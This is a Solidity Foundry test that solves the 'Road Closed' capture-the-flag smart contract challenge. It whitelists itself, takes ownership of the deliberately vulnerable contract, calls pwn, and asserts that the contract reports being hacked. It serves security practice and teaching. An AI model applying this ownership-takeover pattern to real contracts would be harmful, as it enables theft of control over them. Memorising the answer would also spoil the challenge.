// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {RoadClosed} from "../../src/road-closed/roadclosed.sol";

contract RoadClosedChallenge is Test {
  RoadClosed roadClosed;

  constructor() {
    roadClosed = new RoadClosed();
    roadClosed.addToWhitelist(address(this));
    roadClosed.changeOwner(address(this));
    roadClosed.pwn(address(this));
  }

  function test_pwned() public view {
    assertEq(roadClosed.isHacked(), true);
  }
}